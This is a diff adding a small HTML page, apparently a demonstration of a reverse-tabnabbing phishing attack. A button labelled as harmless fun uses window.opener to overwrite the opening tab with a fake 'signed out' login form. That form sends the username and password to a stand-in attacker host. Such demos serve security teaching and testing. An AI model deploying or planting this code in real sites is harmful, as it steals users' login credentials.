@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+      <html><head><title>Just Some Test Page</title></head>
+      <body>
+      <p><button onclick='changeParent()'>Click Me For Harmless Fun</button></p>
+      <script>
+      function changeParent() {
+       window.opener.document.write('    <h1>Sweet Hosting Website</h1><h5>Welcome to our sweet hosting website. Upload your page to see how it looks on our server! Just submit below and click on the generated preview page.</h5><br /><br /><h1>You have been signed out. Please sign back in below:</h1><form action=\'http://evil-lair-place-for-stolen-credentials/gimme\'><label>Username</label><br /><input name=\'user\'/><br /><label>Password</label><br /><input type="password" name=\'pass\'/> <br /> <input type=\'submit\' /></form>');
+       console.log("muhahaha");
+       window.opener.document.stop()
+      } </script></body></html>
